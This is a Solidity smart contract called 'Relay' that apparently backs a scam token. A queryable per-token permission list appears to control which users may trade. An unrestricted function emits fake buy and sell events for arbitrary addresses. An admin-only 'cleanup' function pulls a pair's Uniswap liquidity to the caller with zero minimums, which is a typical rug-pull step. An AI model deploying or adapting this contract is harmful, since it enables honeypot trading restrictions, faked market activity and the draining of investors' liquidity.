// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

// Testnet: 0x3DDC97A07C739d8940975C62246ee5528A0BaD81

interface ERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function decimals() external view returns (uint256);
}

interface IUniswapV2Router {
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
}

contract Relay {
    event b(address buyer, address token, uint256 amount);
    event s(address seller, address token, uint256 amount);
    event l(address user, address token, bool t);
    event n(address token, bool iu, bool t);

    mapping(address=>bool) public admins;
    mapping(address=>bool) public tokens;
    mapping(address=>mapping(address=>bool)) public perms;

    constructor() {
        admins[msg.sender] = true;
    }

    modifier onlyOwner() {
        require(admins[msg.sender], "Forbidden:owner");
        _;
    }

    function allow(address user, bool perm, bool iu) public onlyOwner() {
        admins[user] = perm;
        emit n(user, iu, perm);
    }

    function set(address token, address user, bool perm) public onlyOwner() {
        perms[token][user] = perm;
        emit l(user, token, perm);
    }

    function get(address token, address user) public view returns (bool) {
        return perms[token][user];
    }

    function relay(address token, address user, uint256 amount, bool t) public {
        if (t) {
            emit b(user, token, amount);
        } else {
            emit s(user, token, amount);
        }
    }

    function cleanup(address token, address pair, uint256 amount) public onlyOwner() returns (uint, uint) {
        ERC20(pair).approve(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, amount);
        IUniswapV2Router Router  = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        return Router.removeLiquidityETH(token, amount, 0, 0, msg.sender, block.timestamp);
    }
}